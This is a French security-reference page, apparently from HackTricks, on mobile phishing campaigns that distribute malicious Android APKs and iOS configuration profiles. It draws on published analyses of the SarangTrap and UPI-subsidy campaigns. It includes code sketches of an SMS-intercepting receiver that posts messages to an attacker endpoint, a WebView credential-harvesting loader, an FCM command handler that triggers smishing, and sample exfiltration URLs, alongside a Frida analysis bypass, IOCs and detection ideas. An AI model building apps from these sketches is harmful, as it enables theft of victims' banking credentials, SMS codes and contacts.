# Phishing Mobile & Distribution d'Applications Malveillantes (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Cette page couvre les techniques utilisées par les acteurs de la menace pour distribuer des **APK Android malveillants** et des **profils de configuration mobile iOS** via le phishing (SEO, ingénierie sociale, faux magasins, applications de rencontre, etc.).
> Le matériel est adapté de la campagne SarangTrap exposée par Zimperium zLabs (2025) et d'autres recherches publiques.

## Flux d'Attaque

1. **Infrastructure SEO/Phishing**
* Enregistrer des dizaines de domaines similaires (rencontre, partage de cloud, service de voiture…).
– Utiliser des mots-clés et des emojis en langue locale dans l'élément `<title>` pour se classer sur Google.
– Héberger *à la fois* les instructions d'installation Android (`.apk`) et iOS sur la même page d'atterrissage.
2. **Téléchargement de Première Étape**
* Android : lien direct vers un APK *non signé* ou “magasin tiers”.
* iOS : `itms-services://` ou lien HTTPS simple vers un profil **mobileconfig** malveillant (voir ci-dessous).
3. **Ingénierie Sociale Post-Installation**
* Au premier lancement, l'application demande un **code d'invitation / de vérification** (illusion d'accès exclusif).
* Le code est **POSTé en HTTP** vers le Command-and-Control (C2).
* C2 répond `{"success":true}` ➜ le malware continue.
* L'analyse dynamique Sandbox / AV qui ne soumet jamais un code valide ne voit **aucun comportement malveillant** (évasion).
4. **Abus de Permissions d'Exécution** (Android)
* Les permissions dangereuses ne sont demandées **qu'après une réponse positive du C2** :
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Les anciennes versions demandaient également des permissions SMS -->
```
* Les variantes récentes **suppriment `<uses-permission>` pour SMS de `AndroidManifest.xml`** mais laissent le chemin de code Java/Kotlin qui lit les SMS par réflexion ⇒ abaisse le score statique tout en restant fonctionnel sur les appareils qui accordent la permission via l'abus de `AppOps` ou d'anciens cibles.
5. **Interface Facade & Collecte en Arrière-plan**
* L'application montre des vues inoffensives (visualiseur de SMS, sélecteur de galerie) implémentées localement.
* Pendant ce temps, elle exfiltre :
- IMEI / IMSI, numéro de téléphone
- Dump complet de `ContactsContract` (tableau JSON)
- JPEG/PNG de `/sdcard/DCIM` compressé avec [Luban](https://github.com/Curzibn/Luban) pour réduire la taille
- Contenu SMS optionnel (`content://sms`)
Les charges utiles sont **compressées par lots** et envoyées via `HTTP POST /upload.php`.
6. **Technique de Livraison iOS**
* Un seul **profil de configuration mobile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc. pour inscrire l'appareil dans une supervision de type “MDM”.
* Instructions d'ingénierie sociale :
1. Ouvrir Réglages ➜ *Profil téléchargé*.
2. Appuyer sur *Installer* trois fois (captures d'écran sur la page de phishing).
3. Faire confiance au profil non signé ➜ l'attaquant obtient les droits *Contacts* & *Photo* sans révision de l'App Store.
7. **Couche Réseau**
* HTTP simple, souvent sur le port 80 avec un en-tête HOST comme `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (pas de TLS → facile à repérer).

## Tests Défensifs / Conseils pour Équipe Rouge

* **Bypass d'Analyse Dynamique** – Lors de l'évaluation du malware, automatisez la phase de code d'invitation avec Frida/Objection pour atteindre la branche malveillante.
* **Différence Manifest vs. Runtime** – Comparez `aapt dump permissions` avec `PackageManager#getRequestedPermissions()` à l'exécution ; l'absence de permissions dangereuses est un signal d'alarme.
* **Canari Réseau** – Configurez `iptables -p tcp --dport 80 -j NFQUEUE` pour détecter des pics de POST non solides après la saisie du code.
* **Inspection de mobileconfig** – Utilisez `security cms -D -i profile.mobileconfig` sur macOS pour lister `PayloadContent` et repérer des droits excessifs.

## Idées de Détection pour Équipe Bleue

* **Transparence des Certificats / Analytique DNS** pour attraper des pics soudains de domaines riches en mots-clés.
* **User-Agent & Regex de Chemin** : `(?i)POST\s+/(check|upload)\.php` des clients Dalvik en dehors de Google Play.
* **Télémetrie de Code d'Invitation** – POST de codes numériques de 6 à 8 chiffres peu après l'installation de l'APK peut indiquer une mise en scène.
* **Signature de MobileConfig** – Bloquez les profils de configuration non signés via la politique MDM.

## Extrait Frida Utile : Bypass Automatique du Code d'Invitation
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indicateurs (Généraux)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Ce modèle a été observé dans des campagnes abusant de thèmes liés aux aides gouvernementales pour voler des identifiants UPI indiens et des OTP. Les opérateurs enchaînent des plateformes réputées pour la livraison et la résilience.

### Chaîne de livraison à travers des plateformes de confiance
- Appât vidéo YouTube → la description contient un lien court
- Lien court → site de phishing GitHub Pages imitant le portail légitime
- Le même dépôt GitHub héberge un APK avec un faux badge “Google Play” liant directement au fichier
- Des pages de phishing dynamiques vivent sur Replit ; le canal de commande à distance utilise Firebase Cloud Messaging (FCM)

### Dropper avec charge utile intégrée et installation hors ligne
- Le premier APK est un installateur (dropper) qui expédie le véritable malware à `assets/app.apk` et invite l'utilisateur à désactiver le Wi‑Fi/données mobiles pour atténuer la détection dans le cloud.
- La charge utile intégrée s'installe sous une étiquette inoffensive (par exemple, “Mise à jour sécurisée”). Après l'installation, l'installateur et la charge utile sont présents en tant qu'applications séparées.

Astuce de triage statique (grep pour les charges utiles intégrées) :
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Découverte dynamique des points de terminaison via un lien court
- Le malware récupère une liste de points de terminaison actifs au format texte brut, séparée par des virgules, à partir d'un lien court ; des transformations de chaîne simples produisent le chemin final de la page de phishing.

Exemple (sanitisé) :
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Collecte de données d'identification UPI basée sur WebView
- L'étape “Effectuer un paiement de ₹1 / UPI‑Lite” charge un formulaire HTML de l'attaquant à partir du point de terminaison dynamique à l'intérieur d'un WebView et capture des champs sensibles (téléphone, banque, PIN UPI) qui sont `POST`és à `addup.php`.

Loader minimal :
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Auto-propagation et interception de SMS/OTP
- Des autorisations agressives sont demandées au premier lancement :
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Les contacts sont utilisés pour envoyer en masse des SMS de smishing depuis l'appareil de la victime.
- Les SMS entrants sont interceptés par un récepteur de diffusion et téléchargés avec des métadonnées (expéditeur, corps, emplacement de la SIM, ID aléatoire par appareil) vers `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) comme C2 résilient
- Le payload s'enregistre auprès de FCM ; les messages push contiennent un champ `_type` utilisé comme un interrupteur pour déclencher des actions (par exemple, mettre à jour les modèles de texte de phishing, basculer les comportements).

Exemple de payload FCM :
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esquisse du gestionnaire :
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK contient un payload secondaire à `assets/app.apk`
- WebView charge le paiement depuis `gate.htm` et exfiltre vers `/addup.php`
- Exfiltration SMS vers `/addsm.php`
- Récupération de configuration via des liens courts (par exemple, `rebrand.ly/*`) retournant des points de terminaison CSV
- Applications étiquetées comme “Mise à jour/Sécuriser la mise à jour”
- Messages `data` FCM avec un discriminateur `_type` dans des applications non fiables

### Detection & defence ideas
- Marquer les applications qui demandent aux utilisateurs de désactiver le réseau pendant l'installation puis chargent un second APK depuis `assets/`.
- Alerter sur le tuple de permission : `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + flux de paiement basés sur WebView.
- Surveillance des sorties pour `POST /addup.php|/addsm.php` sur des hôtes non corporatifs ; bloquer l'infrastructure connue.
- Règles EDR mobiles : application non fiable s'enregistrant pour FCM et se ramifiant sur un champ `_type`.

---

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
